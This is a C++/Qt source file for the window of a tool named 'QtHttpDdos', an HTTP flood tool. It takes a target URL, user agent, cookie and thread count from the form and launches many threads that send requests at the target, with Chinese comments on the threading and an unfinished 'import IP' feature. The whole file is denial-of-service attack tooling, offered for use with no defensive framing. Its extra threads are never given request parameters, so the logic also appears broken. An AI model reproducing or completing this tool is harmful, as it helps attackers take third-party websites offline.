#include "QtHttpDdos.h"
#include "ui_QtHttpDdos.h"

#include <QMessageBox>

QtHttpDdos::QtHttpDdos(QWidget *parent) :
    QWidget(parent),
    ui(new Ui::QtHttpDdos)
{
    m_pRequestThead = new QHttpThread(this);

    m_pFlushRequestCountTimer = new QTimer();

    ui->setupUi(this);
}

QtHttpDdos::~QtHttpDdos()
{
    if(m_pRequestThead){
        m_pRequestThead->stopThreadImmediately();
        m_pRequestThead->wait();
    }

    delete ui;
}

void QtHttpDdos::startRequest()
{
    QString url = ui->urlEdt->text();
    QString ua = ui->uaEdt->text();
    QString cookie = ui->cookieEdt->text();
    int count = ui->runCountEdt->text().toInt();

    //设置请求参数
    m_pRequestThead->setParse(url,count,ua,cookie);
    if(m_pRequestThead->isRunning()){
        return;
    }
    //开始线程（主线程）
    m_pRequestThead->start();
    for(int i = 1; i < count ; i++){
        //新建线程，临时线程，用完销毁
        QHttpThread *thread = new QHttpThread(NULL);
        connect(thread,&QThread::finished
                   ,thread,&QObject::deleteLater);//线程结束后调用deleteLater来销毁分配的内存
        thread->start();
    }
}

void QtHttpDdos::stopRequest()
{
    m_pRequestThead->stopThreadImmediately();
}
//开始/暂停请求
void QtHttpDdos::on_controllerpbn_clicked()
{
    if(ui->controllerpbn->text() == "start"){
        ui->controllerpbn->setText("stop");
        startRequest();
    }else{
        ui->controllerpbn->setText("start");
        stopRequest();
    }
}

void QtHttpDdos::on_importIpbtn_clicked()
{
    QMessageBox::information(this,"提示","该功能正在开发");
}


